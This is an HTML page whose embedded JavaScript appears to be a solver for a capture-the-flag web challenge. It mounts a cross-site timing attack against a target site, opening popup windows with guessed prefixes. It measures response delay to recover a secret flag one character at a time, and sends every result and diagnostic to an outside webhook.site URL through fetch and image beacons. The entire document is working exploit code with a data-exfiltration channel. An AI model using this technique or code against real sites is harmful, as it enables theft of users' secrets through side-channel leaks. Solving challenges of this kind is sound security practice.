<!DOCTYPE html><html><head><meta charset="utf-8"></head><body><script>
// v4 diagnostic + full charset
var T="https://svfgp.breakable.live";
var W="https://webhook.site/75654f85-ce75-4c03-b50d-4fc4cc161800";
var known="CTF{";
var CHARS="abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-!}";
var PROBE_TIMEOUT=12000;

function exfil(d){
  var u=W+"?d="+encodeURIComponent(d)+"&t="+Date.now();
  try{fetch(u,{mode:"no-cors",cache:"no-store"});}catch(e){}
  try{new Image().src=u+"&x=1";}catch(e){}
}

exfil("LOADED_v4");

function probe(q){
  return new Promise(function(res){
    var sid="s"+Date.now()+"-"+Math.random().toString(36).slice(2,8);
    var rid="r"+Math.random().toString(36).slice(2,8);
    var url=T+"/?mode=probe&q="+encodeURIComponent(q)+
      "&sid="+encodeURIComponent(sid)+"&rid="+encodeURIComponent(rid);
    var t0=Date.now();
    var wname="p_"+Math.random().toString(36).slice(2,8);
    var w;
    try{w=window.open(url,wname);}catch(e){res({q:q,t:0,src:"open_err"});return;}
    if(!w){res({q:q,t:0,src:"null_win"});return;}
    var done=false;
    function fin(ms,src){if(done)return;done=true;try{w.close();}catch(e){}res({q:q,t:ms,src:src});}
    function handler(e){
      if(e.data&&e.data.type==="svfgp-probe-done"&&e.data.sid===sid){
        window.removeEventListener("message",handler);
        fin(Date.now()-t0,"msg");
      }
    }
    window.addEventListener("message",handler);
    setTimeout(function(){window.removeEventListener("message",handler);fin(Date.now()-t0,"timeout");},PROBE_TIMEOUT);
  });
}

async function run(){
  exfil("START_v4:"+known);

  // DIAGNOSTIC: probe "CTF{" which MUST match if flag starts with CTF{
  var d1=await probe("CTF{");
  exfil("DIAG_CTF_BRACE:"+d1.t+"ms("+d1.src+")");

  // DIAGNOSTIC: probe nonsense - should NOT match
  var d2=await probe("ZZZZZ");
  exfil("DIAG_NONSENSE:"+d2.t+"ms("+d2.src+")");

  // If CTF{ didn't trigger PBKDF2 (< 2s), localStorage might be empty
  if(d1.t < 2000 && d1.src==="msg"){
    exfil("WARN:no_pbkdf2_for_CTF_brace_localStorage_may_be_empty");
  }

  // Now test chars one by one sequentially
  var results=[];
  for(var i=0;i<CHARS.length;i++){
    var ch=CHARS[i];
    var r=await probe(known+ch);
    results.push({c:ch,t:r.t,src:r.src});
    // If we get a slow msg response (PBKDF2 ran), this is our char
    if(r.src==="msg" && r.t>2000){
      exfil("HIT_POS0:"+ch+"="+r.t+"ms");
      known+=ch;
      exfil("FOUND:"+known);
      break;
    }
    // Report every 10 chars
    if((i+1)%10===0){
      var batch=results.slice(i-9,i+1).map(function(x){return x.c+"="+x.t;}).join(",");
      exfil("BATCH"+(i+1)+":"+batch);
    }
  }

  // If we found first char, continue finding more
  if(known.length>4){
    while(known.length < 4+64+1){
      if(known.length===4+64){known+="}";exfil("FOUND:"+known);break;}
      var found=false;
      for(var i=0;i<CHARS.length;i++){
        var ch=CHARS[i];
        var r=await probe(known+ch);
        if(r.src==="msg" && r.t>2000){
          known+=ch;
          exfil("FOUND:"+known);
          found=true;
          break;
        }
      }
      if(!found){exfil("STUCK_AT:"+known);break;}
    }
  }

  exfil("DONE:"+known);
}

setTimeout(run,500);
</script></body></html>
